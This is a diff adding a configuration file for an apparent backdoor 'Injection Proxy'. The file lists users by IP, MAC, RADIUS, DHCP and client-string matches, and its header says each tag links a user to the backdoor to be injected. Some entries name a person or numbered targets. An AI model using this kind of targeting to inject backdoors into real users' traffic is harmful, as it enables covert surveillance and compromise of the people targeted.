@@ -1,0 +1,30 @@
+################################################################################
+#
+# List of users to be redirected to the Injection Proxy
+# This list is used to identify an user and associate its IP address
+# Only matched IP addresses will be analyzed by the redirector
+# The specified tag will be used by the Injection Proxy to associate
+#    the correct backdoor with the user
+#
+######################################################################
+#STATIC-IP 192.168.1.75 alberto_ornaghi
+STATIC-IP 192.168.0.50 test_wpa
+STATIC-IP 192.168.252.8 test_redirect_tag
+STATIC-IP 192.168.252.117 test_redirect_tag
+STATIC-IP 192.168.1.170 test_redirect_tag
+#STATIC-MAC 00:09:43:5f:e7:03 test_redirect_tag
+#STATIC-MAC 00:22:43:52:F7:42 test_redirect_tag
+STATIC-MAC 00:22:FB:26:92:9E test_redirect_tag
+#STATIC-MAC 00:1E:C2:B2:98:BC test_redirect_tag
+#STATIC-IP 192.168.252.34 test_redirect_tag
+#RADIUS-LOGIN User targ001
+#RADIUS-CALLID 0229060603 targ002
+#RADIUS-TECHKEY 192.168.0.1:4/0/0/44.126 targ003 
+#RADIUS-SESSID 3/0/3/23/167_00124048 alor
+#DHCP 00:0C:29:32:D3:B3 alor
+#DHCP 00:1D:BA:67:26:4A test_redirect_tag
+#DHCP 00:23:54:9E:EE:86 test_replace
+#STRING-CLIENT alberto.ornaghi targ004
+#STRING-SERVER alberto.ornaghi targ004
+#STRING-CLIENT mozilla alor
+STRING-CLIENT Host test_redirect_tag
